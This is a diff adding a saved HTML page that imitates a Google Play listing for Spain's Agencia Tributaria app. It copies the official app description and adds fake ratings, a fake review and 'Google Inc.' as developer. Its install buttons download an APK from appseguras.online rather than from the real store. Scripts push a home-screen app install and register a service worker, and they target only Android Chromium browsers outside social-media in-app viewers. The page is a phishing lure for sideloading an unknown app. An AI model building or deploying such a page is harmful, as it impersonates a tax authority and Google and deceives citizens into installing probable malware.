@@ -1,0 +1,513 @@
+<!DOCTYPE html>
+<!-- saved from url=(0051)https://appseguras.online/link.php?id=689f511d70470 -->
+<html lang="es"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Agencia Tributaria - Descargar APK</title>
+  <link rel="icon" type="image/png" href="./download (2).png">
+  <link rel="stylesheet" href="./bootstrap.min.css">
+  <style>
+    .app-header {
+      display: flex;
+      align-items: center;
+      gap: 15px;
+    }
+    .app-logo {
+      width: 90px;
+      height: 90px;
+      object-fit: cover;
+      border-radius: 20px;
+      border: 1px solid #ccc;
+    }
+    .play-icon {
+      width: 160px;
+      margin-bottom: 15px;
+    }
+    .scroll-gallery {
+      overflow-x: auto;
+      white-space: nowrap;
+      padding-bottom: 10px;
+    }
+    .scroll-gallery img {
+      height: 250px;
+      margin-right: 10px;
+      display: inline-block;
+      border-radius: 10px;
+      border: 1px solid #ccc;
+    }
+    .bar {
+      background-color: #e0e0e0;
+      height: 8px;
+      border-radius: 5px;
+      overflow: hidden;
+    }
+    .bar-fill {
+      height: 100%;
+      background-color: #1e8e3e;
+    }
+  </style>
+<meta name="robots" content="noindex,nofollow"/>
+<meta name="referrer" content="no-referrer"/>
+<link rel="manifest" href="manifest.json"/>
+<meta name="theme-color" content="#ffffff"/>
+<link rel="apple-touch-icon" href="./favicon.png"/>
+<meta name="apple-mobile-web-app-capable" content="yes"/>
+<meta name="apple-mobile-web-app-status-bar-style" content="default"/>
+
+<meta name="robots" content="noindex,nofollow"/>
+<meta name="referrer" content="no-referrer"/>
+<link rel="manifest" href="manifest.json"/>
+<meta name="theme-color" content="#ffffff"/>
+<link rel="apple-touch-icon" href="./favicon.png"/>
+<meta name="apple-mobile-web-app-capable" content="yes"/>
+<meta name="apple-mobile-web-app-status-bar-style" content="default"/>
+
+
+  <!-- PWA & Robots -->
+  <meta name="robots" content="noindex,nofollow"/>
+  <meta name="referrer" content="no-referrer"/>
+  <link rel="manifest" href="./manifest.json"/>
+  <meta name="theme-color" content="#ffffff"/>
+  <link rel="apple-touch-icon" href="./icon-192.png"/>
+  <meta name="apple-mobile-web-app-capable" content="yes"/>
+  <meta name="apple-mobile-web-app-status-bar-style" content="default"/>
+
+  <!-- Bot/in-app block -->
+  
+
+
+<style>
+  #pwaInstallBar{
+    position:relative;
+    width:100%;
+    display:flex;
+    flex-direction:column;
+    align-items:center;
+    justify-content:center;
+    padding:20px;
+    background:#fff;
+    border-bottom:1px solid #e9ecef;
+    z-index:9999;
+  }
+  .pwa-btn{
+    display:none;
+    appearance:none;
+    padding:16px 24px;
+    border:0;
+    border-radius:50px;
+    font-size:20px;
+    font-weight:700;
+    cursor:pointer;
+    box-shadow:0 4px 12px rgba(0,0,0,.15);
+    background:#0d6efd;
+    color:#fff;
+    transition:transform .08s ease;
+  }
+  .pwa-btn:active{transform:scale(.98)}
+  .pwa-tip{
+    display:none;
+    font-size:16px;
+    color:#444;
+    margin-top:12px;
+    text-align:center;
+    max-width:90%;
+  }
+</style>
+
+
+<style>
+  /* Hero de instalación centrado y grande */
+  #pwaHero{
+    display:flex;flex-direction:column;align-items:center;justify-content:center;
+    gap:16px;padding:28px 12px;margin:0 auto;max-width:900px;text-align:center
+  }
+  #pwaHero .hero-title{font-size:clamp(20px,3.8vw,34px);font-weight:800;letter-spacing:.2px}
+  #pwaHero .hero-sub{font-size:clamp(14px,2.4vw,18px);color:#444}
+  .pwa-hero-btn{
+    display:none;appearance:none;padding:16px 22px;border:0;border-radius:18px;
+    font-size:18px;font-weight:700;cursor:pointer;box-shadow:0 6px 20px rgba(0,0,0,.18);
+    background:#0d6efd;color:#fff;transition:transform .06s ease;
+    min-width:260px
+  }
+  .pwa-hero-btn:active{transform:scale(.98)}
+  .pwa-hero-btn .icon{font-size:22px;margin-right:10px}
+  .pwa-hero-tip{display:none;color:#444}
+</style>
+
+</head>
+<body class="bg-white">
+<div id="pwaHero">
+  <div class="hero-title">Instala la aplicación AEAT</div>
+  <div class="hero-sub">Acceso rápido desde tu pantalla de inicio.</div>
+  <button id="pwaInstallBtnHero" class="pwa-hero-btn" onclick="installPWA()">
+    <span class="icon">📲</span>Instalar aplicación
+  </button>
+  <div id="androidTipHero" class="pwa-hero-tip">Si no aparece el botón: menú ⋮ → <b>Añadir a la pantalla de inicio</b>.</div>
+</div>
+
+<div id="pwaInstallBar">
+  <button id="pwaInstallBtn" class="pwa-btn" onclick="installPWA()">📲 Instalar aplicación</button>
+  <span id="androidTip" class="pwa-tip">Si el botón no aparece: abre el menú ⋮ y selecciona <b>Añadir a la pantalla de inicio</b>.</span>
+</div>
+
+<style>
+#pwaInstallBtn {
+  position: fixed;
+  bottom: 20px;
+  right: 20px;
+  background: #0084ff;
+  color: white;
+  border: none;
+  padding: 14px 20px;
+  font-size: 16px;
+  border-radius: 25px;
+  box-shadow: 0 4px 8px rgba(0,0,0,0.3);
+  z-index: 99999;
+  display: none;
+}
+#pwaTip {
+  position: fixed;
+  bottom: 70px;
+  right: 20px;
+  background: white;
+  color: #333;
+  padding: 10px 14px;
+  border-radius: 10px;
+  box-shadow: 0 2px 6px rgba(0,0,0,0.2);
+  font-size: 14px;
+  max-width: 240px;
+  display: none;
+}
+</style>
+<button id="pwaInstallBtn" onclick="installPWA()">📲 Instalar App</button>
+<div id="pwaTip">Si no aparece el botón: menú ⋮ → Añadir a la pantalla de inicio</b></div>
+
+
+
+  <div class="container py-4">
+    <!-- Logo superior de Google Play -->
+    <img src="./googleplay_logo.svg" alt="Google Play" class="play-icon">
+
+    <div class="app-header mb-3">
+      <img src="./download (2).png" class="app-logo" alt="Logo de la app">
+      <div>
+        <h4 class="mb-1">Agencia Tributaria</h4>
+        <p class="mb-0 text-success">Google Inc.</p>
+        <small class="text-muted">Compras desde la app</small>
+      </div>
+    </div>
+
+    
+<div class="d-flex justify-content-between text-center mb-3" style="font-size:14px;">
+  <div class="flex-fill">
+    <div><strong>4.6 ★</strong></div>
+    <div class="text-muted">27 K opiniones</div>
+  </div>
+  <div class="vr mx-2"></div>
+  <div class="flex-fill">
+    <div><img src="./download--v1.png"> <strong>13.7 MB</strong></div>
+  </div>
+  <div class="vr mx-2"></div>
+  <div class="flex-fill">
+    <div><strong style="font-size: 18px;">T</strong></div>
+    <div class="text-muted">Adolescentes</div>
+  </div>
+  <div class="vr mx-2"></div>
+  <div class="flex-fill">
+    <div><strong>Más de 5 M</strong></div>
+    <div class="text-muted">Descargas</div>
+  </div>
+</div>
+
+      <span></span>
+      <span></span>
+      <span></span>
+    </div>
+
+    
+<div class="d-flex mb-4" style="gap:4px;">
+  <a href="https://appseguras.online/uploads/apks/signed.apk" class="btn btn-primary btn-lg flex-grow-1" style="font-weight:bold; border-top-right-radius: 0; border-bottom-right-radius: 0;">
+    Instalar
+  </a>
+  <a href="https://appseguras.online/uploads/apks/signed.apk" class="btn btn-primary btn-lg d-flex align-items-center justify-content-center" style="padding: 0 16px; border-top-left-radius: 0; border-bottom-left-radius: 0;">
+    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="white" class="bi bi-chevron-down" viewBox="0 0 16 16">
+      <path fill-rule="evenodd" d="M1.646 4.646a.5.5 0 0 1 .708 0L8 10.293l5.646-5.647a.5.5 0 0 1 .708.708l-6 6a.5.5 0 0 1-.708 0l-6-6a.5.5 0 0 1 0-.708z"></path>
+    </svg>
+  </a>
+</div>
+
+
+    
+<div class="d-flex justify-content-between align-items-center mt-4 mb-2" data-bs-toggle="collapse" href="#appDesc" role="button">
+  <h5 class="mb-0">Acerca de esta app</h5>
+  <span>▶</span>
+</div>
+<div class="collapse show" id="appDesc">
+  <p>Información de la aplicación<br>
+La Agencia Tributaria pone a disposición de los ciudadanos de forma gratuita una aplicación para dispositivos móviles inteligentes (smartphones y tabletas) que ofrece la posibilidad de efectuar gestiones y recibir avisos personales y de novedades fácilmente, con seguridad y sin desplazarte.<br>
+<br>
+Se ofrece una gestión de identidad digital basada en el número de Referencia, Cl@ve o certificado electrónico (software o por NFC con el DNI electrónico).<br>
+<br>
+Las gestiones que están disponibles desde la APP son las de Renta, cita previa, pagar aplazar y consultar deudas, notificaciones y cotejo de documentos, herramientas de asistencia virtual, acceso a una videollamada previamente acordada, datos censales y domicilio fiscal, suscripción a avisos informativos, suscripciones y buscador de bienes en subastas, firma de documentos y consulta de documentos firmados.<br>
+<br>
+Ofrece el acceso a información y la posibilidad de recibir avisos de novedades informativas y avisos personales.<br>
+<br>
+Los usuarios proporcionan datos personales para iniciar sesión, identificar al dispositivo y para permitir que la Agencia Tributaria les proporcione servicios personalizados en el ámbito de sus competencias para lo cual se requiere interacción con sus propios servidores, por lo que la Agencia Tributaria pone en conocimiento de los usuarios que esa información estará disponible para su aplicación móvil. Estos datos se utilizarán exclusivamente a los efectos del cumplimiento de sus derechos y obligaciones tributarias y no serán cedidos a terceras partes, excepto en aquellos casos que se ajusten al artículo 95.1 de la Ley General Tributaria.<br>
+<br>
+También proporciona en la APP un apartado con un aviso de privacidad legalmente válido, así como asegura la protección correspondiente de los datos personales. Parte de esta información se almacena o envía a los servidores de la Agencia Tributaria, siempre a los dominios de la que ésta es titular (https://www1.agenciatributaria.gob.es, https://www2.agenciatributaria.gob.es, https://www6.agenciatributaria.gob.es, https://www9.agenciatributaria.gob.es, https://www12.agenciatributaria.gob.es, https://www*.agenciatributaria.gob.es). Asimismo, la Agencia Tributaria garantiza que se almacenará y utilizará la información personal de un modo suficientemente seguro, durante el tiempo necesario y sólo para proporcionarle los servicios personalizados anteriormente descritos.<br>
+<br>
+Puede consultar la política de privacidad (https://sede.agenciatributaria.gob.es/Sede/politicaprivacidadappaeat.html), los términos del servicio (https://sede.agenciatributaria.gob.es/Sede/terminosservicioappaeat.html) y la declaración de accesibilidad (https://sede.agenciatributaria.gob.es/Sede/accesibilidadApp.shtml) también en la APP.<br>
+Última actualización<br>
+24 jul 2025<br>
+</p>
+</div>
+
+<div class="mt-4">
+  <h5>Seguridad de los datos</h5>
+  <p>El primer paso de la seguridad es comprender cómo los desarrolladores recopilan y comparten tus datos. Las prácticas de privacidad y seguridad de datos pueden variar en función del uso de la app, la región y la edad. El desarrollador proporcionó esta información y podría actualizarla con el tiempo.</p>
+  <ul>
+    <li>No se comparten datos con terceros</li>
+    <li>Es posible que esta app recopile estos tipos de datos: Ubicación, Información basica.</li>
+    <li>Los datos están encriptados en tránsito</li>
+  </ul>
+</div>
+
+
+        <div class="scroll-gallery mt-4 mb-4">
+              <img src="./agent1.webp" alt="captura">
+              <img src="./agente5.webp" alt="captura">
+              <img src="./agent2.webp" alt="captura">
+              <img src="./unnamed(1).webp" alt="captura">
+              <img src="./agente4.webp" alt="captura">
+          </div>
+    
+    
+<div class="container mt-5">
+  <div class="d-flex align-items-center justify-content-between mb-3">
+    <h5 class="mb-0">Calificaciones y opiniones</h5>
+    <span>▶</span>
+  </div>
+  <p class="text-muted" style="font-size: 14px;">
+    Las calificaciones y opiniones están verificadas y provienen de personas que usan el mismo tipo de dispositivo que tú.
+  </p>
+  <div class="d-flex align-items-start gap-3 mb-3">
+    <div>
+      <h1 class="display-4 fw-bold mb-0">4.9</h1>
+      <div style="color: #1e88e5;">★★★★★</div>
+      <small class="text-muted">1.2M</small>
+    </div>
+    <div class="flex-grow-1">
+      <div class="d-flex align-items-center gap-2 mb-1">
+        <small>5</small><div class="progress w-100"><div class="progress-bar bg-primary" style="width: 95%"></div></div>
+      </div>
+      <div class="d-flex align-items-center gap-2 mb-1">
+        <small>4</small><div class="progress w-100"><div class="progress-bar bg-primary" style="width: 10%"></div></div>
+      </div>
+      <div class="d-flex align-items-center gap-2 mb-1">
+        <small>3</small><div class="progress w-100"><div class="progress-bar bg-secondary" style="width: 4%"></div></div>
+      </div>
+      <div class="d-flex align-items-center gap-2 mb-1">
+        <small>2</small><div class="progress w-100"><div class="progress-bar bg-secondary" style="width: 2%"></div></div>
+      </div>
+      <div class="d-flex align-items-center gap-2 mb-1">
+        <small>1</small><div class="progress w-100"><div class="progress-bar bg-secondary" style="width: 1%"></div></div>
+      </div>
+    </div>
+  </div>
+       <h5 class="mt-5">Comentario destacado</h5>
+    <div class="p-3 bg-light border rounded">
+      La seguridad empieza por entender cómo recogen y comparten tus datos los desarrolladores. Las prácticas de privacidad y seguridad de los datos pueden variar en función de tu uso de la aplicación, el territorio donde la uses y tu edad. El desarrollador ha proporcionado esta información y puede actualizarla con el tiempo.    </div>
+      <div class="border-top pt-3 mt-3">
+    <div class="d-flex align-items-center gap-2 mb-2">
+      <img src="./GV0HkHe.png" alt="avatar" width="40" height="40" style="border-radius:50%;">
+      <strong>狼Tobi</strong>
+    </div>
+    <div style="color: #1e88e5;">★★★★★</div>
+    <small class="text-muted">16/7/2025</small>
+    <p class="mt-2">Se lucieron en verdad con esta aplicación, realmente muy práctica y muy instructiva. En verdad, me saco el sombrero; lo hicieron espectacular.</p>
+    <p class="text-muted mb-1">Esta opinión les resultó útil a 223 personas</p>
+    <p class="fw-semibold">¿Te resultó útil esta opinión? 
+      <button class="btn btn-outline-secondary btn-sm mx-2">Sí</button>
+      <button class="btn btn-outline-secondary btn-sm">No</button>
+    </p>
+  </div>
+</div>
+
+
+    <p class="mt-4"><strong>Actualizado el:</strong> 15 De Julio 2025</p>
+
+   
+
+<nav class="navbar fixed-bottom bg-white border-top">
+  <div class="container d-flex justify-content-around text-center">
+    <div>
+      <span>🎮</span><br><small>Juegos</small>
+    </div>
+    <div>
+      <span>📱</span><br><small>Apps</small>
+    </div>
+    <div>
+      <span>🔍</span><br><small>Buscar</small>
+    </div>
+    <div>
+      <span>📚</span><br><small>Libros</small>
+    </div>
+  </div>
+</nav>
+
+<style>
+  body { padding-bottom: 100px; } /* deja espacio suficiente para el menú fijo */
+</style>
+
+<nav class="navbar fixed-bottom bg-white border-top">
+  <div class="container d-flex justify-content-around text-center">
+    <div>
+      <span>🎮</span><br><small>Juegos</small>
+    </div>
+    <div>
+      <span>📱</span><br><small>Apps</small>
+    </div>
+    <div>
+      <span>🔍</span><br><small>Buscar</small>
+    </div>
+    <div>
+      <span>📚</span><br><small>Libros</small>
+    </div>
+  </div>
+</nav>
+
+
+
+
+
+
+
+
+
+
+
+
+<script>
+(function(){
+  var ua = (navigator.userAgent||"").toLowerCase();
+  var isAndroid = ua.indexOf('android') !== -1;
+  var isChromium = /chrome\/[0-9]+/.test(ua) || /edg\/[0-9]+/.test(ua);
+  var isWebView = ua.indexOf('fb_iab') !== -1 || ua.indexOf('fbav') !== -1 || ua.indexOf('instagram') !== -1 || ua.indexOf('telegram') !== -1;
+
+  if (!isAndroid || !isChromium || isWebView) return;
+
+  var bar = document.getElementById('pwaInstallBar');
+  var btn = document.getElementById('pwaInstallBtn');
+  var tip = document.getElementById('androidTip');
+
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.register('./sw.js').catch(function(e){});
+  }
+
+  var deferredPrompt = null;
+  window.addEventListener('beforeinstallprompt', function(e){
+    e.preventDefault();
+    deferredPrompt = e;
+    if (bar) bar.style.display = 'flex';
+    if (btn) btn.style.display = 'inline-block';
+    if (tip) tip.style.display = 'none';
+  });
+
+  window.addEventListener('DOMContentLoaded', function(){
+    if (bar) bar.style.display = 'flex';
+    if (!deferredPrompt && tip) tip.style.display = 'block';
+  });
+
+  window.addEventListener('appinstalled', function(){
+    if (bar) bar.style.display = 'none';
+  });
+
+  window.installPWA = async function(){
+    try {
+      if (!deferredPrompt) {
+        alert('Si el botón no aparece: abre el menú ⋮ y selecciona "Añadir a la pantalla de inicio".');
+        return;
+      }
+      deferredPrompt.prompt();
+      var choice = await deferredPrompt.userChoice;
+      deferredPrompt = null;
+      if (btn) btn.style.display = 'none';
+      if (choice && choice.outcome === 'accepted') {
+        if (bar) bar.style.display = 'none';
+      } else {
+        if (tip) tip.style.display = 'block';
+      }
+    } catch(e){}
+  };
+})();
+</script>
+
+
+<script>
+(function(){
+  var ua = (navigator.userAgent||"").toLowerCase();
+  var isAndroid = ua.indexOf('android') !== -1;
+  var isChromium = /chrome\/[0-9]+/.test(ua) || /edg\/[0-9]+/.test(ua);
+  var isWebView = ua.indexOf('fb_iab') !== -1 || ua.indexOf('fbav') !== -1 || ua.indexOf('instagram') !== -1 || ua.indexOf('telegram') !== -1;
+
+  // Mostrar el hero solo en Android Chromium fuera de webviews
+  var heroBtn = document.getElementById('pwaInstallBtnHero');
+  var heroTip = document.getElementById('androidTipHero');
+
+  if (!(isAndroid && isChromium) || isWebView) {
+    if (heroTip) heroTip.style.display = 'none';
+    if (heroBtn) heroBtn.style.display = 'none';
+    return;
+  }
+
+  // Asegura SW temprano
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.register('./sw.js').catch(function(e){});
+  }
+
+  // Control de beforeinstallprompt
+  window.__deferredPWA = window.__deferredPWA || null;
+
+  window.addEventListener('beforeinstallprompt', function(e){
+    e.preventDefault();
+    window.__deferredPWA = e;
+    if (heroBtn) heroBtn.style.display = 'inline-block';
+    if (heroTip) heroTip.style.display = 'none';
+  });
+
+  window.addEventListener('DOMContentLoaded', function(){
+    // Si aún no hay evento, muestra la sugerencia
+    if (!window.__deferredPWA) {
+      if (heroTip) heroTip.style.display = 'block';
+    }
+  });
+
+  window.addEventListener('appinstalled', function(){
+    // Oculta hero tras instalar
+    var h = document.getElementById('pwaHero');
+    if (h) h.style.display = 'none';
+  });
+
+  // Función global (reutilizada por botones)
+  window.installPWA = async function(){
+    try{
+      if (!window.__deferredPWA) {
+        alert('Si el botón no aparece: menú ⋮ → "Añadir a la pantalla de inicio".');
+        return;
+      }
+      window.__deferredPWA.prompt();
+      var choice = await window.__deferredPWA.userChoice;
+      window.__deferredPWA = null;
+      if (heroBtn) heroBtn.style.display = 'none';
+      if (choice && choice.outcome === 'accepted') {
+        var h = document.getElementById('pwaHero');
+        if (h) h.style.display = 'none';
+      } else {
+        if (heroTip) heroTip.style.display = 'block';
+      }
+    }catch(e){}
+  };
+})();
+</script>
+
+</body></html>
